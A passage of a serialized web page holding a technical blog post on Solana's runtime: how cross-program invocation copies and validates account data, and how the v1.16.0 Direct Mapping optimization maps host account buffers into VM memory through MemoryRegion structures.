token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    lamports\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],\"$L2a3\",\"$L2a4\",\"$L2a5\",\"$L2a6\",\"$L2a7\",\"$L2a8\",\"$L2a9\",\"$L2aa\",\"$L2ab\",\"$L2ac\",\"$L2ad\",\"$L2ae\",\"$L2af\",\"$L2b0\",\"$L2b1\",\"$L2b2\",\"$L2b3\",\"$L2b4\",\"$L2b5\",\"$L2b6\",\"$L2b7\",\"$L2b8\",\"$L2b9\",\"$L2ba\",\"$L2bb\",\"$L2bc\",\"$L2bd\",\"$L2be\",\"$L2bf\",\"$L2c0\",\"$L2c1\",\"$L2c2\",\"$L2c3\",\"$L2c4\",\"$L2c5\",\"$L2c6\",\"$L2c7\",\"$L2c8\",\"$L2c9\",\"$L2ca\",\"$L2cb\",\"$L2cc\",\"$L2cd\",\"$L2ce\",\"$L2cf\",\"$L2d0\",\"$L2d1\",\"$L2d2\",\"$L2d3\",\"$L2d4\",\"$L2d5\",\"$L2d6\",\"$L2d7\",\"$L2d8\",\"$L2d9\",\"$L2da\",\"$L2db\",\"$L2dc\",\"$L2dd\",\"$L2de\",\"$L2df\",\"$L2e0\",\"$L2e1\",\"$L2e2\",\"$L2e3\",\"$L2e4\",\"$L2e5\",\"$L2e6\",\"$L2e7\",\"$L2e8\",\"$L2e9\",\"$L2ea\",\"$L2eb\",\"$L2ec\",\"$L2ed\",\"$L2ee\",\"$L2ef\",\"$L2f0\",\"$L2f1\",\"$L2f2\",\"$L2f3\",\"$L2f4\",\"$L2f5\",\"$L2f6\",\"$L2f7\",\"$L2f8\",\"$L2f9\",\"$L2fa\",\"$L2fb\",\"$L2fc\",\"$L2fd\",\"$L2fe\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"50:[\"$\",\"p\",\"p-42\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"When Program B finishes execution, the runtime uses these mutable references to directly update Program A's VM memory without additional lookup.\"}]\n51:[\"$\",\"h4\",\"h4-2\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 3: Validation and Cache Update\"}]\n"])</script><script>self.__next_f.push([1,"52:[\"$\",\"p\",\"p-43\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Before handing control to Program B, the runtime validates everything Program A has done so far, similar to the validation phase in single program execution. Only after validation passes are Program A's changes written to the shared cache. This ensures that the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" always holds valid account state, so each program in the call chain sees only validated changes from previous programs.\"]}]\n"])</script><script>self.__next_f.push([1,"53:[\"$\",\"h4\",\"h4-3\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 4: Serialization to Callee VM\"}]\n"])</script><script>self.__next_f.push([1,"54:[\"$\",\"p\",\"p-44\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Program B gets its own fresh VM with a new \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region. All account data from the shared cache gets serialized and copied into Program B's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region, just like in single program execution. Program B can now run normally, seeing the same \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" structures as if it were called directly.\"]}]\n"])</script><script>self.__next_f.push([1,"55:[\"$\",\"h3\",\"h3-9\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"CPI Return Process\"}]\n56:[\"$\",\"p\",\"p-45\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/cpi_return.png\",\"alt\":\"CPI Return\"}]}]}]\n57:[\"$\",\"p\",\"p-46\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"When Program B finishes execution, the runtime must ensure all changes from Program B are valid before merging them back to Program A. Here's what happens:\"}]\n58:[\"$\",\"h4\",\"h4-4\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 1: Validation and Cache Update\"}]\n"])</script><script>self.__next_f.push([1,"59:[\"$\",\"p\",\"p-47\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Program B's VM states are revalidated using the same rules as single program execution. This prevents Program B from violating ownership rules, stealing funds, or modifying read-only accounts. Only validated changes are written back to the shared cache, again, ensuring \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" always holds valid account state for subsequent programs in the call chain.\"]}]\n"])</script><script>self.__next_f.push([1,"5a:[\"$\",\"h4\",\"h4-5\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 2: Memory Buffer Management\"}]\n"])</script><script>self.__next_f.push([1,"5b:[\"$\",\"p\",\"p-48\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Account data may grow during Program B's execution when the program calls \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"realloc()\"}],\" to expand account storage. This happens when programs need to add new data fields, grow vectors, store additional state information, or allocate space for user data like NFT metadata. To handle this growth efficiently, the runtime reserves extra padding beyond the current data length when accounts are initially serialized into Program A's VM memory. This reserved space avoids expensive reallocation during execution. If Program B's growth exceeds the reserved padding, the transaction immediately reverts.\"]}]\n"])</script><script>self.__next_f.push([1,"5c:[\"$\",\"h4\",\"h4-6\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 3: Update Caller and Resume Execution\"}]\n"])</script><script>self.__next_f.push([1,"5d:[\"$\",\"p\",\"p-49\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Validated account states from the shared cache are copied back into Program A's VM memory \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region. The runtime uses \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" structures with their mutable references to efficiently update Program A's serialized account data.\"]}]\n"])</script><script>self.__next_f.push([1,"5e:[\"$\",\"h3\",\"h3-10\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"The Performance Problem\"}]\n5f:[\"$\",\"p\",\"p-50\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Consider a typical DeFi swap with 4 nested program calls, each handling 10KB of account data. In the legacy model, each CPI call requires serializing this data into the callee's VM, then copying it back on return. For our 4-level call chain, this means 40KB of serialization going down and 40KB of copying back up, totaling 80KB of memory operations for a single transaction.\"}]\n60:[\"$\",\"p\",\"p-51\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"For a high-throughput blockchain processing thousands of complex transactions per second, this overhead becomes the performance bottleneck. Validators spent more time copying memory than executing actual program logic.\"}]\n61:[\"$\",\"p\",\"p-52\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Solana needed a better runtime.\"}]\n62:[\"$\",\"h2\",\"h2-5\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"The Optimization That Broke Everything: Direct Mapping (v1.16.0)\"}]\n"])</script><script>self.__next_f.push([1,"63:[\"$\",\"p\",\"p-53\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"In Solana version 1.16.0, an optimization known as \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Direct Mapping\"}],\" was introduced to address the performance issues arising from repetitive serialization and deserialization of large account data. Instead of creating separate copies of account data in the VM's INPUT region, Direct Mapping exposes the host's actual account data buffers directly to the VM, allowing programs to read and write the same memory that the host uses to store account state. This optimization is only applied to the account data field, and not other fields such as account owner or lamport. The justification is that all other fields are relatively small is size, and the overhead of the optimization might outweigh the performance gained. Only the data field is large enough to justify such optimizations.\"]}]\n"])</script><script>self.__next_f.push([1,"64:[\"$\",\"h3\",\"h3-11\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"MemoryRegion: The Foundation of VM Address Translation\"}]\n65:[\"$\",\"p\",\"p-54\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Since we're preparing to map host memory into the virtual guest memory space, it's crucial to explain how Solana manages guest virtual memory.\"}]\n"])</script><script>self.__next_f.push([1,"66:[\"$\",\"p\",\"p-55\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The VM and host operate in separate address spaces. When a program running in the VM accesses memory at address \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"0x400000000\"}],\", this virtual address must be translated to an actual host memory location. Solana handles this translation through \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" structures:\"]}]\n"])</script><script>self.__next_f.push([1,"67:[\"$\",\"pre\",\"pre-6\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" host_addr\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start host address\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],\"$L2ff\",\"$L300\",\"$L301\",\"$L302\",\"$L303\",\"$L304\",\"$L305\",\"$L306\",\"$L307\",\"$L308\",\"$L309\",\"$L30a\",\"$L30b\",\"$L30c\",\"$L30d\",\"$L30e\",\"$L30f\",\"$L310\",\"$L311\",\"$L312\",\"$L313\",\"$L314\",\"$L315\",\"$L316\",\"$L317\",\"$L318\",\"$L319\",\"$L31a\",\"$L31b\",\"$L31c\",\"$L31d\",\"$L31e\",\"$L31f\",\"$L320\",\"$L321\",\"$L322\",\"$L323\",\"$L324\",\"$L325\",\"$L326\",\"$L327\",\"$L328\",\"$L329\",\"$L32a\",\"$L32b\",\"$L32c\",\"$L32d\",\"$L32e\",\"$L32f\",\"$L330\",\"$L331\",\"$L332\",\"$L333\",\"$L334\",\"$L335\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"68:[\"$\",\"p\",\"p-56\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Each \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" maps a range of VM virtual addresses to host memory addresses. When the VM accesses memory, the runtime looks up the appropriate \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" and translates the virtual address to the corresponding host address.\"]}]\n"])</script><script>self.__next_f.push([1,"69:[\"$\",\"h3\",\"h3-12\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Legacy Model: Single MemoryRegion\"}]\n6a:[\"$\",\"p\",\"p-57\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"In the legacy model, all account data was packed into one large serialized blob in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region, managed by a single \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\":\"]}]\n6b:[\"$\",\"pre\",\"pre-7\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"VM Address Range: 0x400000000 - 0x400100000\\nHost Address: Points to serialized account data buffer\\nState: Writable\\n\"}]}]\n6c:[\"$\",\"p\",\"p-58\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"This single \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" contained all serialized account data in one contiguous buffer.\"]}]\n6d:[\"$\",\"p\",\"p-59\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/legacy_memoryregion.png\",\"alt\":\"Legacy MemoryRegion\"}]}]}]\n6e:[\"$\",\"h3\",\"h3-13\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Direct Mapping: Multiple MemoryRegions per Account\"}]\n"])</script><script>self.__next_f.push([1,"6f:[\"$\",\"p\",\"p-60\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Direct Mapping fundamentally changes this architecture. Instead of creating separate copies of account data in a serialized buffer, Direct Mapping creates individual \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" for each account that point directly to the host's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" buffers. When a program accesses \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"account.data\"}],\", the VM translates this access through the account's specific \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to read or write the same memory buffer that the host uses to store the account state, eliminating the copying step entirely.\"]}]\n"])</script><script>self.__next_f.push([1,"70:[\"$\",\"p\",\"p-61\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/new_memoryregion.png\",\"alt\":\"Legacy MemoryRegion\"}]}]}]\n"])</script><script>self.__next_f.push([1,"71:[\"$\",\"p\",\"p-62\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The diagram above shows this architectural shift: from one large \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" containing serialized copies to multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegions\"}],\" pointing directly to host account buffers.\"]}]\n"])</script><script>self.__next_f.push([1,"72:[\"$\",\"h3\",\"h3-14\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Changes to the MemoryRegion Structure\"}]\n73:[\"$\",\"p\",\"p-63\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"And just by this, we just got rid of the need for excessive copies! Sounds too good to be true, right?\"}]\n"])</script><script>self.__next_f.push([1,"74:[\"$\",\"p\",\"p-64\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The optimization comes at a cost. Most noteably, Direct Mapping breaks the fundamental execution model that Solana previously relied upon. In the legacy model, programs could freely modify their VM memory because changes only affected local copies - validation happened afterward before committing to the host. With Direct Mapping, this approach no longer works because every VM write directly affects the actual account state recorded in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" within \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" immediately. This forces Solana to implement immediate permission validation on every memory access.\"]}]\n"])</script><script>self.__next_f.push([1,"75:[\"$\",\"p\",\"p-65\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"But what checks must be done? Is read and write checks sufficient? The answer, unfortunately, is no. We'll start with presenting the changes to the MemoryRegion structure, and work our way back to the reasons behind the change.\"}]\n"])</script><script>self.__next_f.push([1,"76:[\"$\",\"pre\",\"pre-8\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px 